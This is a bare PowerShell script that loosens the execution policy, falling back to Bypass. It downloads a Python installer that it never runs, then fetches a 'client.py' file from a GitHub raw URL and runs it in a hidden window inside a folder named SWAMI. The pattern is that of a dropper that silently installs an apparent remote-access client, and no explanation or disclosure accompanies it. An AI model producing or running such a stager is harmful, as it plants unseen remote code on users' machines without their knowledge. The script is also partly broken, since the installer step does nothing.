# Check the current execution policy
$currentPolicy = Get-ExecutionPolicy

clear

if ($currentPolicy -eq 'Restricted') {
    Write-Output "Execution policy is Restricted. Setting to AllSigned..."
    try {
        Set-ExecutionPolicy -ExecutionPolicy AllSigned -Scope CurrentUser -Force
    }
    catch {
        Write-Warning "Failed to set policy to AllSigned, setting to Bypass for process scope."
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
    }
} else {
    Write-Output "Execution policy is $currentPolicy. No need to change."
}

Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe" -OutFile "python-installer.exe"

python --version

mkdir SWAMI

cd SWAMI

iwr "https://raw.githubusercontent.com/ArcticHonour/client/refs/heads/main/client.py" -UseBasicParsing -OutFile client.py

Start-Process python.exe -ArgumentList "client.py" -WindowStyle Hidden 
